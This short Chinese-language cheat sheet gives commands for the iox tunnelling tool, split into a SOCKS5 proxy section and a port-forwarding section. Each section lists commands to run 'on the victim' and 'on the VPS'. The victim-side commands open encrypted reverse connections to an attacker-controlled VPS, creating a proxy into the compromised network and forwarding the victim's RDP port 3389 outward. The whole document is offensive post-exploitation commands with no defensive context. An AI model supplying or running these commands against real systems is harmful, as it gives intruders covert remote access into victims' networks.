# socks5代理
```
在victim上执行
.\iox-0.4.exe proxy -l *1080 -k 000304
.\iox-0.4.exe proxy -r *vps_ip:1111 -k 000304

在vps上执行
./iox-0.4 proxy -l *1111 -l 1080 -k 000304
```

# 端口转发
```
在victim上执行
./iox-0.4 fwd -r 127.0.0.1:3389 -r *vps_ip:8888 -k 656565

在vps上执行
./iox-0.4 fwd -l *8888 -l 33890 -k 656565
```